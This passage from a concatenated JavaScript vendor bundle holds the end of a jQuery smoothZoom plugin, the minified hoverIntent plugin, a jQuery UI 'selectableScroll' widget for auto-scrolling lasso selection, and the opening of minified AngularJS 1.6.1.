					instance[params].apply(instance, Array.prototype.slice.call(arguments, 1));
				}
			}
		}

		//return for chainability for possible cases
		if (params !== "getZoomData") {
			return this;
		}
	};

	function checkBoolean (_var) {
		if (_var === true) {
			return true;
		} else if (_var) {
			_var = _var.toLowerCase();
			if (_var == 'yes' || _var == 'true') {
				return true;
			}
		}
		return false;
	}

	var prop_transform = 'transform';
	var prop_origin = 'transformOrigin';
	var prop_radius = 'borderRadius';
	var supportsTrans3D = true;

})(jQuery, window, document);

//End - smoothZoom
/*!
 * hoverIntent v1.10.2 // 2020.04.28 // jQuery v1.7.0+
 * http://briancherne.github.io/jquery-hoverIntent/
 *
 * You may use hoverIntent under the terms of the MIT license. Basically that
 * means you are free to use hoverIntent as long as this header is left intact.
 * Copyright 2007-2019 Brian Cherne
 */
!function(factory){"use strict";"function"==typeof define&&define.amd?define(["jquery"],factory):"object"==typeof module&&module.exports?module.exports=factory(require("jquery")):jQuery&&!jQuery.fn.hoverIntent&&factory(jQuery)}(function($){"use strict";function track(ev){cX=ev.pageX,cY=ev.pageY}function isFunction(value){return"function"==typeof value}var cX,cY,_cfg={interval:100,sensitivity:6,timeout:0},INSTANCE_COUNT=0,compare=function(ev,$el,s,cfg){if(Math.sqrt((s.pX-cX)*(s.pX-cX)+(s.pY-cY)*(s.pY-cY))<cfg.sensitivity)return $el.off(s.event,track),delete s.timeoutId,s.isActive=!0,ev.pageX=cX,ev.pageY=cY,delete s.pX,delete s.pY,cfg.over.apply($el[0],[ev]);s.pX=cX,s.pY=cY,s.timeoutId=setTimeout(function(){compare(ev,$el,s,cfg)},cfg.interval)};$.fn.hoverIntent=function(handlerIn,handlerOut,selector){var instanceId=INSTANCE_COUNT++,cfg=$.extend({},_cfg);$.isPlainObject(handlerIn)?(cfg=$.extend(cfg,handlerIn),isFunction(cfg.out)||(cfg.out=cfg.over)):cfg=isFunction(handlerOut)?$.extend(cfg,{over:handlerIn,out:handlerOut,selector:selector}):$.extend(cfg,{over:handlerIn,out:handlerIn,selector:handlerOut});function handleHover(e){var ev=$.extend({},e),$el=$(this),hoverIntentData=$el.data("hoverIntent");hoverIntentData||$el.data("hoverIntent",hoverIntentData={});var state=hoverIntentData[instanceId];state||(hoverIntentData[instanceId]=state={id:instanceId}),state.timeoutId&&(state.timeoutId=clearTimeout(state.timeoutId));var mousemove=state.event="mousemove.hoverIntent.hoverIntent"+instanceId;if("mouseenter"===e.type){if(state.isActive)return;state.pX=ev.pageX,state.pY=ev.pageY,$el.off(mousemove,track).on(mousemove,track),state.timeoutId=setTimeout(function(){compare(ev,$el,state,cfg)},cfg.interval)}else{if(!state.isActive)return;$el.off(mousemove,track),state.timeoutId=setTimeout(function(){!function(ev,$el,s,out){var data=$el.data("hoverIntent");data&&delete data[s.id],out.apply($el[0],[ev])}(ev,$el,state,cfg.out)},cfg.timeout)}}return this.on({"mouseenter.hoverIntent":handleHover,"mouseleave.hoverIntent":handleHover},cfg.selector)}});
/**
 * This module is an extension to jQuery ui selectable, which scrolls when you try to select
 * outside the container, and the scrollables are not fitting it originally.
 *
 * Created by László Károlyi <http://linkedin.com/in/karolyi>
 * with the GPLv3 License: http://opensource.org/licenses/GPL-3.0
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
/*global jQuery*/
(function ($) {
  'use strict';
  $.widget('ui.selectableScroll', $.ui.selectable, {
    options: {
      // If an element is passed in here, use it for scrolling instead of widget's element
      scrollElement: null,
      // When the selection is that pixels near to the top/bottom edges, start to scroll
      scrollSnapX: 5,
      // When the selection is that pixels near to the side edges, start to scroll
      scrollSnapY: 5,
      scrollAmount: 25, // In pixels
      scrollIntervalTime: 100 // In milliseconds
    },

    /**
     * This is a slightly modified version of the original _create function,
     * we just add the element's relative positions too
     *
     * @return null
     */
    _create: function () {
      this.element.addClass('ui-selectable');
      this.dragged = false;
      this.helperClasses = ['no-top', 'no-right', 'no-bottom', 'no-left'];
      this.scrollElement = this.options.scrollElement || this.element;
      this.refresh();
      this._mouseInit();
      this.helper = $('<div class="ui-selectable-helper"></div>');
    },

    /**
     * Cache selectee children based on filter
     * @return null
     */
    refresh: function () {
      var elementOffset = this.scrollElement.offset();
      var scrollLeft = this.scrollElement.prop('scrollLeft');
      var scrollTop = this.scrollElement.prop('scrollTop');
      this.selectees = $(this.options.filter, this.scrollElement[0]);
      this.selectees.addClass('ui-selectee');
      this.selectees.each(function () {
        var $element = $(this),
          pos = $element.offset();
        $.data(this, 'selectable-item', {
          element: this,
          $element: $element,
          left: pos.left,
          top: pos.top,
          right: pos.left + $element.outerWidth(),
          bottom: pos.top + $element.outerHeight(),
          // Relative positions according to the element's 0.0
          relative: {
            left: pos.left - elementOffset.left + scrollLeft,
            top: pos.top - elementOffset.top + scrollTop,
            right: pos.left - elementOffset.left + scrollLeft +
              $element.outerWidth(),
            bottom: pos.top - elementOffset.top + scrollTop +
              $element.outerHeight()
          },
          startselected: false,
          selected: $element.hasClass('ui-selected'),
          selecting: $element.hasClass('ui-selecting'),
          unselecting: $element.hasClass('ui-unselecting')
        });
      });
    },

    /**
     * By starting dragging, calculate the element's current scroll states,
     * relative to the elements 0.0 offset
     *
     * @param  object  The mousedown event
     * @return boolean The parent's _mouseStart return value
     */
    _mouseStart: function (event) {
      var pos = this.scrollElement.offset();
      if (
        (event.pageX > this.scrollElement.prop('clientWidth') + pos.left) ||
        (event.pageY > this.scrollElement.prop('clientHeight') + pos.top)
      ) {
        return false;
      }
      var retValue = $.ui.selectable.prototype._mouseStart.call(this,
        event);
      this.lastDragEvent = null;
      this.scrollInfo = {
        // The element's 0.0 offset related to the document element
        elementOffset: this.scrollElement.offset(),
        // The maximum scrollable width (visible width + scrollLeft)
        scrollWidth: this.scrollElement.prop('scrollWidth'),
        // The maximum scrollable height (visible height + scrollTop)
        scrollHeight: this.scrollElement.prop('scrollHeight'),
        // The visible width (minus scrollbars)
        elementWidth: this.scrollElement.prop('clientWidth'),
        // The visible height (minus scrollbars)
        elementHeight: this.scrollElement.prop('clientHeight')
      };
      // Relative to element's 0
      this.scrollInfo.dragStartXPos = event.pageX - this.scrollInfo.elementOffset
        .left + this.scrollElement.prop('scrollLeft');
      // Relative to element's 0
      this.scrollInfo.dragStartYPos = event.pageY - this.scrollInfo.elementOffset
        .top + this.scrollElement.prop('scrollTop');
      this.scrollIntervalId = null;
      return retValue;
    },

    /**
     * Calculate/redraw the helper lasso, keep the helper within
     * the scrolled element
     *
     * @param  object The options object containing the relative positions of the selected rectangle
     * @return null
     */
    _updateHelper: function (options) {
      var x1, y1, x2, y2; // Absolute positions for the lasso helper
      var lassoClassesArray = [];
      if (options.x1 - options.scrollLeft < 0) {
        lassoClassesArray.push('no-left');
        x1 = this.scrollInfo.elementOffset.left;
      } else {
        x1 = this.scrollInfo.elementOffset.left + options.x1 - options.scrollLeft;
      }
      if (options.y1 - options.scrollTop < 0) {
        lassoClassesArray.push('no-top');
        y1 = this.scrollInfo.elementOffset.top;
      } else {
        y1 = this.scrollInfo.elementOffset.top + options.y1 - options.scrollTop;
      }
      if (options.x2 - options.scrollLeft > this.scrollInfo.elementWidth) {
        lassoClassesArray.push('no-right');
        x2 = this.scrollInfo.elementOffset.left + this.scrollInfo.elementWidth;
      } else {
        x2 = this.scrollInfo.elementOffset.left + options.x2 - options.scrollLeft;
      }
      if (options.y2 - options.scrollTop > this.scrollInfo.elementHeight) {
        lassoClassesArray.push('no-bottom');
        y2 = this.scrollInfo.elementOffset.top + this.scrollInfo.elementHeight;
      } else {
        y2 = this.scrollInfo.elementOffset.top + options.y2 - options.scrollTop;
      }
      for (var counter = 0; counter < this.helperClasses.length; counter++) {
        var className = this.helperClasses[counter];
        if ($.inArray(className, lassoClassesArray) !== -1) {
          this.helper.addClass(className);
        } else {
          this.helper.removeClass(className);
        }
      }
      this.helper.css({
        left: x1,
        top: y1,
        width: x2 - x1,
        height: y2 - y1
      });
    },

    /**
     * If the mouse is near to the edges of the elements area, scroll
     *
     * @return object The new scrollLeft and scrollTop values, and a
     * boolean if the element should keep scrolling
     */
    _scrollIfNeeded: function (options) {
      var scrollLeft = this.scrollElement.prop('scrollLeft');
      var scrollTop = this.scrollElement.prop('scrollTop');

      var keepScrolling = false;
      // Scroll if close to edges or over them
      if (this.lastDragEvent.pageX - this.scrollInfo.elementOffset.left <
        this.options.scrollSnapX && scrollLeft > 0) {
        scrollLeft = scrollLeft < this.options.scrollAmount ? 0 :
          scrollLeft - this.options.scrollAmount;
        this.scrollElement.prop('scrollLeft', scrollLeft);
        keepScrolling = true;
      }
      if (this.lastDragEvent.pageY - this.scrollInfo.elementOffset.top <
        this.options.scrollSnapY && scrollTop > 0) {
        scrollTop = scrollTop < this.options.scrollAmount ? 0 : scrollTop -
          this.options.scrollAmount;
        this.scrollElement.prop('scrollTop', scrollTop);
        keepScrolling = true;
      }
      if (this.lastDragEvent.pageX - this.scrollInfo.elementOffset.left >
        this.scrollInfo.elementWidth - this.options.scrollSnapX && this.scrollInfo
        .scrollWidth > scrollLeft + this.scrollInfo.elementWidth) {
        scrollLeft = scrollLeft + this.options.scrollAmount > this.scrollInfo
          .scrollWidth - this.scrollInfo.elementWidth ? this.scrollInfo.scrollWidth -
          this.scrollInfo.elementWidth : scrollLeft + this.options.scrollAmount;
        this.scrollElement.prop('scrollLeft', scrollLeft);
        keepScrolling = true;
      }
      if (this.lastDragEvent.pageY - this.scrollInfo.elementOffset.top >
        this.scrollInfo.elementHeight - this.options.scrollSnapY && this.scrollInfo
        .scrollHeight > scrollLeft + this.scrollInfo.elementHeight) {
        scrollTop = scrollTop + this.options.scrollAmount > this.scrollInfo
          .scrollHeight - this.scrollInfo.elementHeight ? this.scrollInfo
          .scrollHeight - this.scrollInfo.elementHeight : scrollTop +
          this.options.scrollAmount;
        this.scrollElement.prop('scrollTop', scrollTop);
        keepScrolling = true;
      }
      return {
        scrollLeft: scrollLeft,
        scrollTop: scrollTop,
        keepScrolling: keepScrolling
      };
    },

    /**
     * Calculate a relative position to the element's 0.0 offset,
     * from the original drag event's coordinates
     *
     * @param  object The absolute X and Y positions
     * @return object The relative X and Y positions
     */
    _calcRelativePosition: function (options) {
      var relXPos = options.x - this.scrollInfo.elementOffset.left +
        options.scrollLeft;
      var relYPos = options.y - this.scrollInfo.elementOffset.top +
        options.scrollTop;
      return {
        x: relXPos,
        y: relYPos
      };
    },

    /**
     * Calculate relative area positions to offset element
     *
     * @param  object The relative X and Y positions to the 0.0 of the element
     * @return object An object containing the relative area coordinates
     */
    _calcRelativeArea: function (options) {
      var relX1 = options.xPos < this.scrollInfo.dragStartXPos ? options.xPos :
        this.scrollInfo.dragStartXPos;
      var relY1 = options.yPos < this.scrollInfo.dragStartYPos ? options.yPos :
        this.scrollInfo.dragStartYPos;
      var relX2 = options.xPos > this.scrollInfo.dragStartXPos ? options.xPos :
        this.scrollInfo.dragStartXPos;
      var relY2 = options.yPos > this.scrollInfo.dragStartYPos ? options.yPos :
        this.scrollInfo.dragStartYPos;
      return {
        x1: relX1,
        y1: relY1,
        x2: relX2,
        y2: relY2
      };
    },

    /**
     * Update the selected elements
     *
     * @param  object The return value of _calcRelativeArea()
     * @return null
     */
    _updateSelectees: function (options) {
      var that = this;
      this.selectees.each(function () {
        var selectee = $.data(this, 'selectable-item'),
          hit = false;

        // Prevent helper from being selected if appendTo: selectable
        if (!selectee || selectee.element === that.element[0]) {
          return;
        }

        if (that.options.tolerance === 'touch') {
          hit = (!(selectee.relative.left > options.x2 || selectee.relative
            .right < options.x1 || selectee.relative.top > options.y2 ||
            selectee.relative.bottom < options.y1));
        } else if (that.options.tolerance === 'fit') {
          hit = (selectee.relative.left > options.x1 && selectee.relative
            .right < options.x2 && selectee.relative.top > options.y1 &&
            selectee.relative.bottom < options.y2);
        }

        if (hit) {
          // SELECT
          if (selectee.selected) {
            selectee.$element.removeClass('ui-selected');
            selectee.selected = false;
          }
          if (selectee.unselecting) {
            selectee.$element.removeClass('ui-unselecting');
            selectee.unselecting = false;
          }
          if (!selectee.selecting) {
            selectee.$element.addClass('ui-selecting');
            selectee.selecting = true;
            // selectable SELECTING callback
            that._trigger('selecting', that.lastDragEvent, {
              selecting: selectee.element
            });
          }
        } else {
          // UNSELECT
          if (selectee.selecting) {
            if ((that.lastDragEvent.metaKey || that.lastDragEvent.ctrlKey) &&
              selectee.startselected) {
              selectee.$element.removeClass('ui-selecting');
              selectee.selecting = false;
              selectee.$element.addClass('ui-selected');
              selectee.selected = true;
            } else {
              selectee.$element.removeClass('ui-selecting');
              selectee.selecting = false;
              if (selectee.startselected) {
                selectee.$element.addClass('ui-unselecting');
                selectee.unselecting = true;
              }
              // Selectable UNSELECTING callback
              that._trigger('unselecting', that.lastDragEvent, {
                unselecting: selectee.element
              });
            }
          }
          if (selectee.selected) {
            if (!that.lastDragEvent.metaKey && !that.lastDragEvent.ctrlKey && !
              selectee.startselected) {
              selectee.$element.removeClass('ui-selected');
              selectee.selected = false;

              selectee.$element.addClass('ui-unselecting');
              selectee.unselecting = true;
              // Selectable UNSELECTING callback
              that._trigger('unselecting', that.lastDragEvent, {
                unselecting: selectee.element
              });
            }
          }
        }
      });
    },

    /**
     * The original _mouseDrag function overvritten by our one
     *
     * @param  object  The original mousemove event
     * @return boolean Returning false, as the parent returns too
     */
    _mouseDrag: function (event) {
      this.dragged = true;
      if (this.options.disabled) {
        return;
      }
      this.lastDragEvent = event;

      var scrollObj = this._scrollIfNeeded();

      this._updateIntervals({
        keepScrolling: scrollObj.keepScrolling
      });
      this._updateUi({
        doUpdateHelper: true
      });

      return false;
    },

    /**
     * Do the actual calculating/updating of the positions/elements
     *
     * @param  object Options containing if the function should update the helper lasso
     * @return null
     */
    _updateUi: function (options) {
      var scrollObj = this._scrollIfNeeded({
        pageX: this.lastDragEvent.pageX,
        pageY: this.lastDragEvent.pageY
      });
      var relativePos = this._calcRelativePosition({
        x: this.lastDragEvent.pageX,
        y: this.lastDragEvent.pageY,
        scrollLeft: scrollObj.scrollLeft,
        scrollTop: scrollObj.scrollTop
      });
      var relativeArea = this._calcRelativeArea({
        xPos: relativePos.x,
        yPos: relativePos.y
      });
      if (options.doUpdateHelper) {
        this._updateHelper({
          scrollLeft: scrollObj.scrollLeft,
          scrollTop: scrollObj.scrollTop,
          x1: relativeArea.x1,
          y1: relativeArea.y1,
          x2: relativeArea.x2,
          y2: relativeArea.y2
        });
      }
      this._updateSelectees({
        x1: relativeArea.x1,
        y1: relativeArea.y1,
        x2: relativeArea.x2,
        y2: relativeArea.y2
      });
    },

    /**
     * Start the automatic scrolling if needed
     *
     * @param  object Options containing if the function should start the interval
     * @return null
     */
    _updateIntervals: function (options) {
      var that = this;
      if (options.keepScrolling && !this.scrollIntervalId) {
        this.scrollIntervalId = setInterval(function () {
          that._updateUi({
            doUpdateHelper: false
          });
        }, this.options.scrollIntervalTime);
      }
      if (!options.keepScrolling && this.scrollIntervalId)
        this._clearIntervals();
    },

    /**
     * Clear the autoscroll interval
     *
     * @return null
     */
    _clearIntervals: function () {
      // Stop scrolling
      if (this.scrollIntervalId)
        clearInterval(this.scrollIntervalId);
      this.scrollIntervalId = null;
    },

    /**
     * The original _mouseStop event extended with the interval clearer
     *
     * @param  object  The original mousestop event
     * @return boolean The parent's return value
     */
    _mouseStop: function (event) {
      this._clearIntervals();
      var retValue = $.ui.selectable.prototype._mouseStop.call(this,
        event);
      return retValue;
    }
  });
})(jQuery);

/*
 AngularJS v1.6.1
 (c) 2010-2016 Google, Inc. http://angularjs.org
 License: MIT
*/
(function(z){'use strict';function M(a,b){b=b||Error;return function(){var d=arguments[0],c;c="["+(a?a+":":"")+d+"] http://errors.angularjs.org/1.6.1/"+(a?a+"/":"")+d;for(d=1;d<arguments.length;d++){c=c+(1==d?"?":"&")+"p"+(d-1)+"=";var f=encodeURIComponent,e;e=arguments[d];e="function"==typeof e?e.toString().replace(/ \{[\s\S]*$/,""):"undefined"==typeof e?"undefined":"string"!=typeof e?JSON.stringify(e):e;c+=f(e)}return new b(c)}}function ta(a){if(null==a||Wa(a))return!1;if(C(a)||E(a)||D&&a instanceof
D)return!0;var b="length"in Object(a)&&a.length;return Y(b)&&(0<=b&&(b-1 in a||a instanceof Array)||"function"===typeof a.item)}function q(a,b,d){var c,f;if(a)if(y(a))for(c in a)"prototype"!==c&&"length"!==c&&"name"!==c&&a.hasOwnProperty(c)&&b.call(d,a[c],c,a);else if(C(a)||ta(a)){var e="object"!==typeof a;c=0;for(f=a.length;c<f;c++)(e||c in a)&&b.call(d,a[c],c,a)}else if(a.forEach&&a.forEach!==q)a.forEach(b,d,a);else if(Dc(a))for(c in a)b.call(d,a[c],c,a);else if("function"===typeof a.hasOwnProperty)for(c in a)a.hasOwnProperty(c)&&
b.call(d,a[c],c,a);else for(c in a)va.call(a,c)&&b.call(d,a[c],c,a);return a}function Ec(a,b,d){for(var c=Object.keys(a).sort(),f=0;f<c.length;f++)b.call(d,a[c[f]],c[f]);return c}function Fc(a){return function(b,d){a(d,b)}}function ie(){return++rb}function Sb(a,b,d){for(var c=a.$$hashKey,f=0,e=b.length;f<e;++f){var g=b[f];if(F(g)||y(g))for(var h=Object.keys(g),k=0,l=h.length;k<l;k++){var m=h[k],n=g[m];d&&F(n)?fa(n)?a[m]=new Date(n.valueOf()):Xa(n)?a[m]=new RegExp(n):n.nodeName?a[m]=n.cloneNode(!0):
Tb(n)?a[m]=n.clone():(F(a[m])||(a[m]=C(n)?[]:{}),Sb(a[m],[n],!0)):a[m]=n}}c?a.$$hashKey=c:delete a.$$hashKey;return a}function R(a){return Sb(a,wa.call(arguments,1),!1)}function je(a){return Sb(a,wa.call(arguments,1),!0)}function Z(a){return parseInt(a,10)}function Ub(a,b){return R(Object.create(a),b)}function w(){}function Ya(a){return a}function ma(a){return function(){return a}}function Vb(a){return y(a.toString)&&a.toString!==na}function x(a){return"undefined"===typeof a}function v(a){return"undefined"!==
typeof a}function F(a){return null!==a&&"object"===typeof a}function Dc(a){return null!==a&&"object"===typeof a&&!Gc(a)}function E(a){return"string"===typeof a}function Y(a){return"number"===typeof a}function fa(a){return"[object Date]"===na.call(a)}function y(a){return"function"===typeof a}function Xa(a){return"[object RegExp]"===na.call(a)}function Wa(a){return a&&a.window===a}function Za(a){return a&&a.$evalAsync&&a.$watch}function Ia(a){return"boolean"===typeof a}function ke(a){return a&&Y(a.length)&&
le.test(na.call(a))}function Tb(a){return!(!a||!(a.nodeName||a.prop&&a.attr&&a.find))}function me(a){var b={};a=a.split(",");var d;for(d=0;d<a.length;d++)b[a[d]]=!0;return b}function xa(a){return P(a.nodeName||a[0]&&a[0].nodeName)}function $a(a,b){var d=a.indexOf(b);0<=d&&a.splice(d,1);return d}function Fa(a,b){function d(a,b){var d=b.$$hashKey,e;if(C(a)){e=0;for(var f=a.length;e<f;e++)b.push(c(a[e]))}else if(Dc(a))for(e in a)b[e]=c(a[e]);else if(a&&"function"===typeof a.hasOwnProperty)for(e in a)a.hasOwnProperty(e)&&
(b[e]=c(a[e]));else for(e in a)va.call(a,e)&&(b[e]=c(a[e]));d?b.$$hashKey=d:delete b.$$hashKey;return b}function c(a){if(!F(a))return a;var b=e.indexOf(a);if(-1!==b)return g[b];if(Wa(a)||Za(a))throw Ga("cpws");var b=!1,c=f(a);void 0===c&&(c=C(a)?[]:Object.create(Gc(a)),b=!0);e.push(a);g.push(c);return b?d(a,c):c}function f(a){switch(na.call(a)){case "[object Int8Array]":case "[object Int16Array]":case "[object Int32Array]":case "[object Float32Array]":case "[object Float64Array]":case "[object Uint8Array]":case "[object Uint8ClampedArray]":case "[object Uint16Array]":case "[object Uint32Array]":return new a.constructor(c(a.buffer),
a.byteOffset,a.length);case "[object ArrayBuffer]":if(!a.slice){var b=new ArrayBuffer(a.byteLength);(new Uint8Array(b)).set(new Uint8Array(a));return b}return a.slice(0);case "[object Boolean]":case "[object Number]":case "[object String]":case "[object Date]":return new a.constructor(a.valueOf());case "[object RegExp]":return b=new RegExp(a.source,a.toString().match(/[^/]*$/)[0]),b.lastIndex=a.lastIndex,b;case "[object Blob]":return new a.constructor([a],{type:a.type})}if(y(a.cloneNode))return a.cloneNode(!0)}
var e=[],g=[];if(b){if(ke(b)||"[object ArrayBuffer]"===na.call(b))throw Ga("cpta");if(a===b)throw Ga("cpi");C(b)?b.length=0:q(b,function(a,d){"$$hashKey"!==d&&delete b[d]});e.push(a);g.push(b);return d(a,b)}return c(a)}function qa(a,b){if(a===b)return!0;if(null===a||null===b)return!1;if(a!==a&&b!==b)return!0;var d=typeof a,c;if(d===typeof b&&"object"===d)if(C(a)){if(!C(b))return!1;if((d=a.length)===b.length){for(c=0;c<d;c++)if(!qa(a[c],b[c]))return!1;return!0}}else{if(fa(a))return fa(b)?qa(a.getTime(),
b.getTime()):!1;if(Xa(a))return Xa(b)?a.toString()===b.toString():!1;if(Za(a)||Za(b)||Wa(a)||Wa(b)||C(b)||fa(b)||Xa(b))return!1;d=W();for(c in a)if("$"!==c.charAt(0)&&!y(a[c])){if(!qa(a[c],b[c]))return!1;d[c]=!0}for(c in b)if(!(c in d)&&"$"!==c.charAt(0)&&v(b[c])&&!y(b[c]))return!1;return!0}return!1}function ab(a,b,d){return a.concat(wa.call(b,d))}function bb(a,b){var d=2<arguments.length?wa.call(arguments,2):[];return!y(b)||b instanceof RegExp?b:d.length?function(){return arguments.length?b.apply(a,
ab(d,arguments,0)):b.apply(a,d)}:function(){return arguments.length?b.apply(a,arguments):b.call(a)}}function Hc(a,b){var d=b;"string"===typeof a&&"$"===a.charAt(0)&&"$"===a.charAt(1)?d=void 0:Wa(b)?d="$WINDOW":b&&z.document===b?d="$DOCUMENT":Za(b)&&(d="$SCOPE");return d}function cb(a,b){if(!x(a))return Y(b)||(b=b?2:null),JSON.stringify(a,Hc,b)}function Ic(a){return E(a)?JSON.parse(a):a}function Jc(a,b){a=a.replace(ne,"");var d=Date.parse("Jan 01, 1970 00:00:00 "+a)/6E4;return ga(d)?b:d}function Wb(a,
b,d){d=d?-1:1;var c=a.getTimezoneOffset();b=Jc(b,c);d*=b-c;a=new Date(a.getTime());a.setMinutes(a.getMinutes()+d);return a}function ya(a){a=D(a).clone();try{a.empty()}catch(b){}var d=D("<div>").append(a).html();try{return a[0].nodeType===Ja?P(d):d.match(/^(<[^>]+>)/)[1].replace(/^<([\w-]+)/,function(a,b){return"<"+P(b)})}catch(c){return P(d)}}function Kc(a){try{return decodeURIComponent(a)}catch(b){}}function Lc(a){var b={};q((a||"").split("&"),function(a){var c,f,e;a&&(f=a=a.replace(/\+/g,"%20"),
c=a.indexOf("="),-1!==c&&(f=a.substring(0,c),e=a.substring(c+1)),f=Kc(f),v(f)&&(e=v(e)?Kc(e):!0,va.call(b,f)?C(b[f])?b[f].push(e):b[f]=[b[f],e]:b[f]=e))});return b}function Xb(a){var b=[];q(a,function(a,c){C(a)?q(a,function(a){b.push(ka(c,!0)+(!0===a?"":"="+ka(a,!0)))}):b.push(ka(c,!0)+(!0===a?"":"="+ka(a,!0)))});return b.length?b.join("&"):""}function db(a){return ka(a,!0).replace(/%26/gi,"&").replace(/%3D/gi,"=").replace(/%2B/gi,"+")}function ka(a,b){return encodeURIComponent(a).replace(/%40/gi,
"@").replace(/%3A/gi,":").replace(/%24/g,"$").replace(/%2C/gi,",").replace(/%3B/gi,";").replace(/%20/g,b?"%20":"+")}function oe(a,b){var d,c,f=Ka.length;for(c=0;c<f;++c)if(d=Ka[c]+b,E(d=a.getAttribute(d)))return d;return null}function pe(a,b){var d,c,f={};q(Ka,function(b){b+="app";!d&&a.hasAttribute&&a.hasAttribute(b)&&(d=a,c=a.getAttribute(b))});q(Ka,function(b){b+="app";var f;!d&&(f=a.querySelector("["+b.replace(":","\\:")+"]"))&&(d=f,c=f.getAttribute(b))});d&&(qe?(f.strictDi=null!==oe(d,"strict-di"),
b(d,c?[c]:[],f)):z.console.error("Angular: disabling automatic bootstrap. <script> protocol indicates an extension, document.location.href does not match."))}function Mc(a,b,d){F(d)||(d={});d=R({strictDi:!1},d);var c=function(){a=D(a);if(a.injector()){var c=a[0]===z.document?"document":ya(a);throw Ga("btstrpd",c.replace(/</,"&lt;").replace(/>/,"&gt;"));}b=b||[];b.unshift(["$provide",function(b){b.value("$rootElement",a)}]);d.debugInfoEnabled&&b.push(["$compileProvider",function(a){a.debugInfoEnabled(!0)}]);
b.unshift("ng");c=eb(b,d.strictDi);c.invoke(["$rootScope","$rootElement","$compile","$injector",function(a,b,d,c){a.$apply(function(){b.data("$injector",c);d(b)(a)})}]);return c},f=/^NG_ENABLE_DEBUG_INFO!/,e=/^NG_DEFER_BOOTSTRAP!/;z&&f.test(z.name)&&(d.debugInfoEnabled=!0,z.name=z.name.replace(f,""));if(z&&!e.test(z.name))return c();z.name=z.name.replace(e,"");$.resumeBootstrap=function(a){q(a,function(a){b.push(a)});return c()};y($.resumeDeferredBootstrap)&&$.resumeDeferredBootstrap()}function re(){z.name=
"NG_ENABLE_DEBUG_INFO!"+z.name;z.location.reload()}function se(a){a=$.element(a).injector();if(!a)throw Ga("test");return a.get("$$testability")}function Nc(a,b){b=b||"_";return a.replace(te,function(a,c){return(c?b:"")+a.toLowerCase()})}function ue(){var a;if(!Oc){var b=sb();(oa=x(b)?z.jQuery:b?z[b]:void 0)&&oa.fn.on?(D=oa,R(oa.fn,{scope:Oa.scope,isolateScope:Oa.isolateScope,controller:Oa.controller,injector:Oa.injector,inheritedData:Oa.inheritedData}),a=oa.cleanData,oa.cleanData=function(b){for(var c,
f=0,e;null!=(e=b[f]);f++)(c=oa._data(e,"events"))&&c.$destroy&&oa(e).triggerHandler("$destroy");a(b)}):D=X;$.element=D;Oc=!0}}function fb(a,b,d){if(!a)throw Ga("areq",b||"?",d||"required");return a}function tb(a,b,d){d&&C(a)&&(a=a[a.length-1]);fb(y(a),b,"not a function, got "+(a&&"object"===typeof a?a.constructor.name||"Object":typeof a));return a}function Pa(a,b){if("hasOwnProperty"===a)throw Ga("badname",b);}function Pc(a,b,d){if(!b)return a;b=b.split(".");for(var c,f=a,e=b.length,g=0;g<e;g++)c=
b[g],a&&(a=(f=a)[c]);return!d&&y(a)?bb(f,a):a}function ub(a){for(var b=a[0],d=a[a.length-1],c,f=1;b!==d&&(b=b.nextSibling);f++)if(c||a[f]!==b)c||(c=D(wa.call(a,0,f))),c.push(b);return c||a}function W(){return Object.create(null)}function Yb(a){if(null==a)return"";switch(typeof a){case "string":break;case "number":a=""+a;break;default:a=!Vb(a)||C(a)||fa(a)?cb(a):a.toString()}return a}function ve(a){function b(a,b,c){return a[b]||(a[b]=c())}var d=M("$injector"),c=M("ng");a=b(a,"angular",Object);a.$$minErr=
a.$$minErr||M;return b(a,"module",function(){var a={};return function(e,g,h){if("hasOwnProperty"===e)throw c("badname","module");g&&a.hasOwnProperty(e)&&(a[e]=null);return b(a,e,function(){function a(b,d,e,f){f||(f=c);return function(){f[e||"push"]([b,d,arguments]);return J}}function b(a,d,f){f||(f=c);return function(b,c){c&&y(c)&&(c.$$moduleName=e);f.push([a,d,arguments]);return J}}if(!g)throw d("nomod",e);var c=[],f=[],p=[],r=a("$injector","invoke","push",f),J={_invokeQueue:c,_configBlocks:f,_runBlocks:p,
requires:g,name:e,provider:b("$provide","provider"),factory:b("$provide","factory"),service:b("$provide","service"),value:a("$provide","value"),constant:a("$provide","constant","unshift"),decorator:b("$provide","decorator",f),animation:b("$animateProvider","register"),filter:b("$filterProvider","register"),controller:b("$controllerProvider","register"),directive:b("$compileProvider","directive"),component:b("$compileProvider","component"),config:r,run:function(a){p.push(a);return this}};h&&r(h);return J})}})}
function ra(a,b){if(C(a)){b=b||[];for(var d=0,c=a.length;d<c;d++)b[d]=a[d]}else if(F(a))for(d in b=b||{},a)if("$"!==d.charAt(0)||"$"!==d.charAt(1))b[d]=a[d];return b||a}function we(a){var b=[];return JSON.stringify(a,function(a,c){c=Hc(a,c);if(F(c)){if(0<=b.indexOf(c))return"...";b.push(c)}return c})}function xe(a){R(a,{bootstrap:Mc,copy:Fa,extend:R,merge:je,equals:qa,element:D,forEach:q,injector:eb,noop:w,bind:bb,toJson:cb,fromJson:Ic,identity:Ya,isUndefined:x,isDefined:v,isString:E,isFunction:y,
isObject:F,isNumber:Y,isElement:Tb,isArray:C,version:ye,isDate:fa,lowercase:P,uppercase:vb,callbacks:{$$counter:0},getTestability:se,reloadWithDebugInfo:re,$$minErr:M,$$csp:za,$$encodeUriSegment:db,$$encodeUriQuery:ka,$$stringify:Yb});Zb=ve(z);Zb("ng",["ngLocale"],["$provide",function(a){a.provider({$$sanitizeUri:ze});a.provider("$compile",Qc).directive({a:Ae,input:Rc,textarea:Rc,form:Be,script:Ce,select:De,option:Ee,ngBind:Fe,ngBindHtml:Ge,ngBindTemplate:He,ngClass:Ie,ngClassEven:Je,ngClassOdd:Ke,
